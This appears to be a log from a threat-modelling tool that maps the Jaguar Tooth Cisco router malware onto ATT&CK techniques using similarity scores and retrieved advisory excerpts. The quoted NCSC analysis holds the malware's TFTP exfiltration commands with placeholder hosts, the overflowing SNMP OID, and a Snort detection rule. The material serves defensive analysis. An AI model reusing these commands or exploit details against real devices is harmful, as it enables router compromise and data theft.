[2025-04-08 17:31:16,345 INFO] Application started with interaction level: LOW (0.000000)
[2025-04-08 17:31:16,345 INFO] Starting time: 2025-04-08 17:31:16
[2025-04-08 17:31:18,304 INFO] Documents loaded: 173
[2025-04-08 17:31:35,595 INFO] Selected malware: Jaguar Tooth
[2025-04-08 17:31:35,596 INFO] Extracted 7 IOCs from the STIX file
[2025-04-08 17:31:35,597 INFO] Inserted state with id: ff9e1ba2-7b3d-4088-a1e0-ac0fcd42768a
[2025-04-08 17:31:42,461 INFO] Processing step relative to tactic: initial-access
[2025-04-08 17:31:42,461 INFO] + Processing action: Exploit Public-Facing Application as used by the malware
[2025-04-08 17:31:43,256 INFO] ++ Embedding computed for: Exploit Public-Facing Application as used by the malware. The vector has shape: (384,)
[2025-04-08 17:31:43,433 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [content injection]: tensor([[0.4178]])
[2025-04-08 17:31:43,580 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [drive-by compromise]: tensor([[0.3854]])
[2025-04-08 17:31:43,818 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [exploit public-facing application]: tensor([[0.5846]])
[2025-04-08 17:31:43,986 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [external remote services]: tensor([[0.2744]])
[2025-04-08 17:31:44,122 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [hardware additions]: tensor([[0.3240]])
[2025-04-08 17:31:44,279 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing]: tensor([[0.2383]])
[2025-04-08 17:31:44,440 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing attachment]: tensor([[0.2643]])
[2025-04-08 17:31:44,543 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing link]: tensor([[0.2353]])
[2025-04-08 17:31:44,777 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing via service]: tensor([[0.2017]])
[2025-04-08 17:31:44,931 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing voice]: tensor([[0.2059]])
[2025-04-08 17:31:45,138 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [replication through removable media]: tensor([[0.3335]])
[2025-04-08 17:31:45,236 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise]: tensor([[0.1613]])
[2025-04-08 17:31:45,426 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise: compromise software dependencies and development tools]: tensor([[0.3002]])
[2025-04-08 17:31:45,604 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise: compromise software supply chain]: tensor([[0.2707]])
[2025-04-08 17:31:45,742 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise: compromise hardware supply chain]: tensor([[0.3072]])
[2025-04-08 17:31:45,964 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [trusted relationship]: tensor([[0.2686]])
[2025-04-08 17:31:46,153 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts]: tensor([[0.3153]])
[2025-04-08 17:31:46,259 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: default accounts]: tensor([[0.1913]])
[2025-04-08 17:31:46,433 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: domain accounts]: tensor([[0.1704]])
[2025-04-08 17:31:46,669 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: local accounts]: tensor([[0.2805]])
[2025-04-08 17:31:46,780 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: cloud accounts]: tensor([[0.1303]])
[2025-04-08 17:31:46,788 INFO] ++ Scores: [('exploit public-facing application', tensor([[0.5846]])), ('content injection', tensor([[0.4178]])), ('drive-by compromise', tensor([[0.3854]])), ('replication through removable media', tensor([[0.3335]])), ('hardware additions', tensor([[0.3240]]))]
[2025-04-08 17:31:46,788 INFO] ++ Similar techniques found:
['exploit public-facing application', 'content injection', 'drive-by compromise', 'replication through removable media', 'hardware additions']
[2025-04-08 17:31:46,788 INFO] ++ Querying the QA model for action Exploit Public-Facing Application as used by the malware with the following context:
exploit public-facing application
content injection
drive-by compromise
replication through removable media
hardware additions
[2025-04-08 17:31:50,170 INFO] ++ QA suggested technique: exploit public-facing application
[2025-04-08 17:31:50,171 INFO] ++ Selected technique: exploit public-facing application
[2025-04-08 17:31:53,692 INFO] ++ Refining the action: Exploit Public-Facing Application as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.\n\nThe vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.'), Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='e72298cc-dfc3-4e64-abe2-158e702c21e3', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.The vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected device via IPv4 or IPv6.\n\nOnly traffic directed to the affected system can be used to exploit these vulnerabilities.To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='You can read their findings and recommendations in theira blog postalso out today.Infrastructure devices are critical components of any organization’s IT infrastructure.\n\nThese devices are often the first line of defense against cyber-attacks and can help prevent unauthorized access to your network.')]
[2025-04-08 17:32:24,799 INFO] ++ Pre-conditions computed for action: Exploit Public-Facing Application as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.\n\nThe vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.'), Document(id='7ce50e75-f4d6-4e1e-acdb-a0efddbf862b', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(id='64ae615b-bf4f-4d89-825f-249570e863cf', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - CiscoSkip to contentSkip to searchSkip to footerCisco.com WorldwideProducts and ServicesSolutionsSupportLearnExplore CiscoHow to BuyPartners HomePartner ProgramSupportToolsFind a Cisco PartnerMeet our PartnersBecome a Cisco PartnerSupportProduct SupportSNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE SoftwareSaveLog into Save ContentTranslationsPrintAvailable LanguagesUpdated:April 21, 2023Document ID:1498756426900165Bias-Free LanguageBias-Free LanguageThe documentation set for this product strives to use bias-free language.'), Document(id='c0c7f06f-c207-4397-a3d7-de46197789e4', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England DigitalSkip to main contentEnglandDigitalClose menuServicesDataCyberDeveloperNewsAboutMenuSearchClose searchNHS DigitalCyber alerts2023CC-4303State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco RoutersThe UK National Cyber Security Centre (NCSC) along with the United States FBI, NSA and CISA have released a joint advisory describing a 2021 campaign exploiting a known SNMP vulnerability in Cisco IOS and Cisco IOS XE.Threat ID:CC-4303Threat Severity:MediumPublished:19 April 2023 4:38 PMReport a cyber attack: call0300 303 5222or email[email\xa0protected]Page contentsSummaryAffected platformsRemediation adviceDefinitive source of threat updatesCVE VulnerabilitiesSummaryThe UK National Cyber Security Centre (NCSC) along with the United States FBI, NSA and CISA have released a joint advisory describing a 2021 campaign exploiting a known SNMP vulnerability in Cisco IOS and Cisco IOS XE.Affected platformsThe following platforms are known to be affected:Cisco IOSCisco IOS XEThreat detailsIntroductionThe UK National Cyber Security Centre (NCSC), the US National Security Agency (NSA), US Cybersecurity and Infrastructure Security Agency (CISA) and US Federal Bureau of Investigation (FBI) have released a joint advisory describing how state-sponsored threat actors (commonly tracked as APT28) successfully exploited Cisco routers during a 2021 campaign using a known Simple Network Management Protocol (SNMP)vulnerability(CVE-2017-6742).CVE-2017-6742 was first disclosed in a Cisco security advisory in June 2017 and relates to abuffer overflowcondition in the SNMP subsystem.'), Document(id='0ee42b9c-0da5-423f-b159-900ed640da0e', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='This malware obtains further device information which is then exfiltrated over trivial file transfer protocol (TFTP) and enables unauthenticated access via a backdoor.The NCSC have attributed the campaign to APT28, whom they assess as "almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165."'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.The vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nA successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.Customers are advised to apply the workaround as contained in the Workarounds section below.'), Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='The vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.\n\nTo exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.\n\nTo exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.')]
[2025-04-08 17:32:36,809 INFO] ++ Post-conditions computed for action: Exploit Public-Facing Application as used by the malware using 6 documents:
[Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='The vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.\n\nTo exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.\n\nTo exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.'), Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.\n\nThe vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.'), Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='c2f8b83c-4c67-40b9-b682-f1c7586fde0e', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='The vulnerable function targeted by this exploit is reached using the SNMP Object Identif ier (OID) \n1.3.6.1.4.1.9.9.95.1.2.4.1.3 , which corresponds to  alpsRemPeerConnLocalPort .\n\nBy \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.The vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3.')]
[2025-04-08 17:32:39,733 INFO] ++ Indicators computed for action: Exploit Public-Facing Application as used by the malware. The indicators are:
['A malicious actor attempts to exploit a public-facing application.']
[2025-04-08 17:32:40,252 INFO] ++ Removed pre-condition: 
Internet connectivity to reach the public-facing application.
, due to similarity with: 
A public-facing application is accessible.
 (tensor([[0.7262]]))
[2025-04-08 17:32:40,770 INFO] ++ Removed pre-condition: 
The malware capable of exploiting the identified vulnerability.
, due to similarity with: 
The application has a vulnerability exploitable by the malware.
 (tensor([[0.7611]]))
[2025-04-08 17:33:31,837 INFO] Processing step relative to tactic: defense-evasion
[2025-04-08 17:33:31,837 INFO] + Processing action: Modify Authentication Process as used by the malware
[2025-04-08 17:33:32,085 INFO] ++ Embedding computed for: Modify Authentication Process as used by the malware. The vector has shape: (384,)
[2025-04-08 17:33:32,220 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism]: tensor([[0.3978]])
[2025-04-08 17:33:32,501 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: setuid and setgid]: tensor([[0.3682]])
[2025-04-08 17:33:32,712 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: bypass user account control]: tensor([[0.4625]])
[2025-04-08 17:33:32,833 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: sudo and sudo caching]: tensor([[0.3920]])
[2025-04-08 17:33:32,911 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: elevated execution with prompt]: tensor([[0.4728]])
[2025-04-08 17:33:32,991 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: temporary elevated cloud access]: tensor([[0.3575]])
[2025-04-08 17:33:33,073 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: tcc manipulation]: tensor([[0.4340]])
[2025-04-08 17:33:33,155 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation]: tensor([[0.4705]])
[2025-04-08 17:33:33,226 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: token impersonation/theft]: tensor([[0.5020]])
[2025-04-08 17:33:33,311 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: create process with token]: tensor([[0.4611]])
[2025-04-08 17:33:33,390 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: make and impersonate token]: tensor([[0.5344]])
[2025-04-08 17:33:33,483 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: parent pid spoofing]: tensor([[0.4631]])
[2025-04-08 17:33:33,575 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: sid-history injection]: tensor([[0.4433]])
[2025-04-08 17:33:33,664 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [bits jobs]: tensor([[0.2507]])
[2025-04-08 17:33:33,733 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [build image on host]: tensor([[0.2086]])
[2025-04-08 17:33:33,794 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [debugger evasion]: tensor([[0.3445]])
[2025-04-08 17:33:33,860 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [deobfuscate/decode files or information]: tensor([[0.3404]])
[2025-04-08 17:33:33,935 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [deploy container]: tensor([[0.2683]])
[2025-04-08 17:33:34,003 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [direct volume access]: tensor([[0.2348]])
[2025-04-08 17:33:34,067 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [domain or tenant policy modification]: tensor([[0.3376]])
[2025-04-08 17:33:34,142 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [domain or tenant policy modification: group policy modification]: tensor([[0.3070]])
[2025-04-08 17:33:34,207 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [domain or tenant policy modification: trust modification]: tensor([[0.3154]])
[2025-04-08 17:33:34,280 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [execution guardrails]: tensor([[0.3599]])
[2025-04-08 17:33:34,366 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [execution guardrails: environmental keying]: tensor([[0.3564]])
[2025-04-08 17:33:34,454 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [execution guardrails: mutual exclusion]: tensor([[0.4544]])
[2025-04-08 17:33:34,536 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [exploitation for defense evasion]: tensor([[0.4250]])
[2025-04-08 17:33:34,622 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [file and directory permissions modification]: tensor([[0.2612]])
[2025-04-08 17:33:34,710 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [file and directory permissions modification: windows file and directory permissions modification]: tensor([[0.2784]])
[2025-04-08 17:33:34,795 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [file and directory permissions modification: linux and mac file and directory permissions modification]: tensor([[0.2389]])
[2025-04-08 17:33:34,880 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts]: tensor([[0.3538]])
[2025-04-08 17:33:34,985 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden files and directories]: tensor([[0.2283]])
[2025-04-08 17:33:35,060 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden users]: tensor([[0.3800]])
[2025-04-08 17:33:35,129 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden window]: tensor([[0.3438]])
[2025-04-08 17:33:35,213 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: ntfs file attributes]: tensor([[0.1364]])
[2025-04-08 17:33:35,299 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden file system]: tensor([[0.1373]])
[2025-04-08 17:33:35,382 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: run virtual instance]: tensor([[0.3663]])
[2025-04-08 17:33:35,472 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: vba stomping]: tensor([[0.2696]])
[2025-04-08 17:33:35,560 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: email hiding rules]: tensor([[0.1858]])
[2025-04-08 17:33:35,651 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: resource forking]: tensor([[0.2285]])
[2025-04-08 17:33:35,737 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: process argument spoofing]: tensor([[0.3069]])
[2025-04-08 17:33:35,822 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: ignore process interrupts]: tensor([[0.3143]])
[2025-04-08 17:33:35,917 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: file/path exclusions]: tensor([[0.2515]])
[2025-04-08 17:33:36,012 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow]: tensor([[0.4002]])
[2025-04-08 17:33:36,126 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dll search order hijacking]: tensor([[0.3670]])
[2025-04-08 17:33:36,206 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dll side-loading]: tensor([[0.2704]])
[2025-04-08 17:33:36,314 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dylib hijacking]: tensor([[0.2420]])
[2025-04-08 17:33:36,403 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: executable installer file permissions weakness]: tensor([[0.3860]])
[2025-04-08 17:33:36,510 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dynamic linker hijacking]: tensor([[0.2926]])
[2025-04-08 17:33:36,593 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: path interception by path environment variable]: tensor([[0.3446]])
[2025-04-08 17:33:36,684 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: path interception by search order hijacking]: tensor([[0.3756]])
[2025-04-08 17:33:36,806 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: path interception by unquoted path]: tensor([[0.2942]])
[2025-04-08 17:33:36,955 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: services file permissions weakness]: tensor([[0.4187]])
[2025-04-08 17:33:37,059 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: services registry permissions weakness]: tensor([[0.4404]])
[2025-04-08 17:33:37,203 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: cor_profiler]: tensor([[0.3670]])
[2025-04-08 17:33:37,318 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: kernelcallbacktable]: tensor([[0.4111]])
[2025-04-08 17:33:37,447 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: appdomainmanager]: tensor([[0.3151]])
[2025-04-08 17:33:37,602 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses]: tensor([[0.3808]])
[2025-04-08 17:33:37,795 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify tools]: tensor([[0.3739]])
[2025-04-08 17:33:37,973 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable windows event logging]: tensor([[0.3975]])
[2025-04-08 17:33:38,160 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: impair command history logging]: tensor([[0.3364]])
[2025-04-08 17:33:38,265 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify system firewall]: tensor([[0.4445]])
[2025-04-08 17:33:38,423 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: indicator blocking]: tensor([[0.3719]])
[2025-04-08 17:33:38,532 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify cloud firewall]: tensor([[0.2864]])
[2025-04-08 17:33:38,677 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify cloud logs]: tensor([[0.3074]])
[2025-04-08 17:33:38,899 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: safe mode boot]: tensor([[0.2671]])
[2025-04-08 17:33:39,041 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: downgrade attack]: tensor([[0.3361]])
[2025-04-08 17:33:39,114 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: spoof security alerting]: tensor([[0.3414]])
[2025-04-08 17:33:39,195 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify linux audit system]: tensor([[0.3897]])
[2025-04-08 17:33:39,307 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impersonation]: tensor([[0.3011]])
[2025-04-08 17:33:39,410 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal]: tensor([[0.2929]])
[2025-04-08 17:33:39,486 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear windows event logs]: tensor([[0.2448]])
[2025-04-08 17:33:39,585 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear linux or mac system logs]: tensor([[0.2811]])
[2025-04-08 17:33:39,657 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear command history]: tensor([[0.3315]])
[2025-04-08 17:33:39,761 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: file deletion]: tensor([[0.3136]])
[2025-04-08 17:33:39,870 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: network share connection removal]: tensor([[0.3218]])
[2025-04-08 17:33:39,964 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: timestomp]: tensor([[0.2249]])
[2025-04-08 17:33:40,064 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear network connection history and configurations]: tensor([[0.3806]])
[2025-04-08 17:33:40,196 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear mailbox data]: tensor([[0.1938]])
[2025-04-08 17:33:40,404 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear persistence]: tensor([[0.3102]])
[2025-04-08 17:33:40,585 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: relocate malware]: tensor([[0.3222]])
[2025-04-08 17:33:40,728 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indirect command execution]: tensor([[0.2261]])
[2025-04-08 17:33:40,849 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading]: tensor([[0.3137]])
[2025-04-08 17:33:40,985 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: invalid code signature]: tensor([[0.2693]])
